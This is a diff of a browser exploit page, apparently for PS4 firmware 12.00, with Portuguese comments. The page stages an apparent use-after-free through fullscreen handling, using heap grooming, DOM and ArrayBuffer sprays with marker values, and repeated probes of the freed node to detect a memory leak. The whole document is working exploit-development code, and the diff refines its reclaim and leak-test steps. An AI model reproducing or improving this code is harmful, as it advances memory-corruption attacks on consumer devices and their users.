@@ -2,18 +2,17 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 12.00 - UAF Exploit Stage</title>
+<title>PS4 12.00 - UAF Exploit Stage (Leak Test)</title>
 </head>
 <body style="background:#111;color:#0f0;font-family:monospace;">
 
-<h2>PS4 12.00 - UAF Exploit Stage (Refined)</h2>
+<h2>PS4 12.00 - UAF Exploit Stage (Leak Detection)</h2>
 <button onclick="runTest()">Run Test</button>
 
 <script>
 
 // ==========================
-// 🔒 LOG SEGURO
-// ==========================
+// 🔒 SAFE LOG (alert)
 let logBuffer = [];
 function log(msg) {
     try { console.log(msg); } catch(e){}
@@ -22,7 +21,6 @@ function log(msg) {
 
 // ==========================
 // HEAP SETUP (INALTERADO)
-// ==========================
 function setupHeap() {
     let controllers = [];
     for(let i = 0; i < 5000; i++) {
@@ -35,7 +33,6 @@ function setupHeap() {
 
 // ==========================
 // FULLSCREEN (INALTERADO)
-// ==========================
 function setupFullscreen() {
     let fsTarget = document.createElement("div");
 
@@ -60,32 +57,20 @@ function setupFullscreen() {
 }
 
 // ==========================
-// 💣 RECLAIM FINO
-// ==========================
+// 💣 RECLAIM + ARRAYBUFFER
 function preciseReclaim(size) {
     log("[*] Reclaim size = " + size);
 
     let bucket = [];
 
-    let ab_views = [];
-
-for (let i = 0; i < 4000; i++) {
-    let buf = new ArrayBuffer(0x100);
-    let view = new Uint32Array(buf);
-
-    view[0] = 0x41414141;
-    view[1] = 0x42424242;
-    view[2] = 0x43434343;
-
-    ab_views.push(view);
-}
-
+    // churn leve
     for (let i = 0; i < 3000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
         el.remove();
     }
 
+    // spray DOM (CONTROL)
     for (let i = 0; i < size; i++) {
         let el = document.createElement("div");
 
@@ -102,6 +87,20 @@ for (let i = 0; i < 4000; i++) {
         bucket.push(el);
     }
 
+    // 🔥 ArrayBuffer spray (possível overlap)
+    let ab_views = [];
+    for (let i = 0; i < 4000; i++) {
+        let buf = new ArrayBuffer(0x100);
+        let view = new Uint32Array(buf);
+
+        view[0] = 0x41414141;
+        view[1] = 0x42424242;
+        view[2] = 0x43434343;
+
+        ab_views.push(view);
+    }
+
+    // churn final
     for (let i = 0; i < 2000; i++) {
         let el = document.createElement("div");
         document.body.appendChild(el);
@@ -112,115 +111,55 @@ for (let i = 0; i < 4000; i++) {
 }
 
 // ==========================
-// 🔬 PROBES AVANÇADOS
-// ==========================
+// 🔬 PROBE + LEAK TEST
 function probe(fsTarget) {
     log("---- PROBE ----");
 
-    // innerHTML
     try {
-        let html = fsTarget.innerHTML;
-        log("[CHECK] innerHTML = l" + html);
+        let child = fsTarget.firstChild;
 
-        if (html && html.includes("CONTROL_")) {
-            log("[!!!] OWNED: CONTROL DETECTADO");
+        log("[PWN] firstChild = " + child);
+
+        if (child) {
+            log("[PWN] tag = " + child.tagName);
+
+            child.innerHTML = "<div id='pwn'>AAAA</div>";
+            log("[PWN] write OK");
+
+            log("[PWN] id = " + child.getAttribute("id"));
         }
 
     } catch(e) {
-        log("[UAF] innerHTML crash");
+        log("[PWN] erro acesso filho");
     }
 
-    // outerHTML
+    // 🔥 LEAK TEST
     try {
-        log("[CHECK] outerHTML = " + fsTarget.outerHTML);
+        let child = fsTarget.firstChild;
+
+        let leak = child.innerHTML;
+
+        log("[LEAK?] innerHTML = " + leak);
+
+        if (leak && (
+            leak.includes("4141") ||
+            leak.includes("4242") ||
+            leak.includes("4343")
+        )) {
+            log("[!!!] POSSIVEL LEAK DE MEMORIA");
+        }
+
     } catch(e) {
-        log("[UAF] outerHTML crash");
+        log("[LEAK] crash leitura");
     }
 
-    // children
-    try {
-        log("[CHECK] children len = " + fsTarget.children.length);
-    } catch(e) {
-        log("[UAF] children crash");
-    }
-
-    // clone
-    try {
-        let clone = fsTarget.cloneNode(true);
-        log("[CHECK] clone OK");
-    } catch(e) {
-        log("[UAF] clone crash");
-    }
-
-    // write
-    try {
-        fsTarget.innerHTML = "<div id='pwn'>AAAA</div>";
-        log("[CHECK] write innerHTML OK");
-    } catch(e) {
-        log("[UAF] write innerHTML crash");
-    }
-    
-    try {
-    let child = fsTarget.firstChild;
-
-    // leitura suspeita
-    let leak = child.innerHTML;
-
-    log("[LEAK?] innerHTML = " + leak);
-
-    if (leak && (
-        leak.includes("4141") ||
-        leak.includes("4242") ||
-        leak.includes("4343")
-    )) {
-        log("[!!!] POSSIVEL LEAK DE MEMORIA");
-    }
-
-} catch(e) {
-    log("[LEAK] crash leitura");
-            }
-
-    // layout
-    try {
-        let h = fsTarget.offsetHeight;
-        log("[CHECK] layout = " + h);
-    } catch(e) {
-        log("[UAF] layout crash");
-    }
-
-    // rect
-    try {
-        fsTarget.getBoundingClientRect();
-        log("[CHECK] rect OK");
-    } catch(e) {
-        log("[UAF] rect crash");
-    }
-
-    // parent
-    try {
-        log("[CHECK] parent = " + fsTarget.parentNode);
-    } catch(e) {
-        log("[UAF] parent crash");
-    }
-
-    // isConnected
-    try {
-        log("[CHECK] isConnected = " + fsTarget.isConnected);
-    } catch(e) {
-        log("[UAF] isConnected crash");
-    }
-
-    // nodeType
-    try {
-        log("[CHECK] nodeType = " + fsTarget.nodeType);
-    } catch(e) {
-        log("[UAF] nodeType crash");
-    }
+    // checks básicos
+    try { log("[CHECK] parent = " + fsTarget.parentNode); } catch(e){}
+    try { log("[CHECK] layout = " + fsTarget.offsetHeight); } catch(e){}
 }
 
 // ==========================
 // TRIGGER (INALTERADO)
-// ==========================
 function trigger(fsTarget) {
     log("[*] Trigger");
 
@@ -235,31 +174,30 @@ function trigger(fsTarget) {
         log("[ERRO]");
     }
 
-    // 🎯 ajuste fino
+    // 🎯 ajuste fino (já validado por você)
     let sizes = [1500, 2000, 2500, 3000];
 
     sizes.forEach((size, idx) => {
         setTimeout(() => preciseReclaim(size), idx * 50);
     });
 
-    // probes repetidos
+    // probes
     setTimeout(() => probe(fsTarget), 10);
-    setTimeout(() => probe(fsTarget), 50);
-    setTimeout(() => probe(fsTarget), 100);
-    setTimeout(() => probe(fsTarget), 180);
-    setTimeout(() => probe(fsTarget), 260);
+    setTimeout(() => probe(fsTarget), 80);
+    setTimeout(() => probe(fsTarget), 160);
+    setTimeout(() => probe(fsTarget), 250);
 
     // dump seguro
     setTimeout(() => {
         alert(logBuffer.join("\n"));
     }, 400);
 
+    // 🔥 NÃO ALTERAR (crítico)
     setTimeout(() => location.reload(), 500);
 }
 
 // ==========================
 // MAIN (INALTERADO)
-// ==========================
 function runTest() {
     log("[*] Iniciando teste");
 
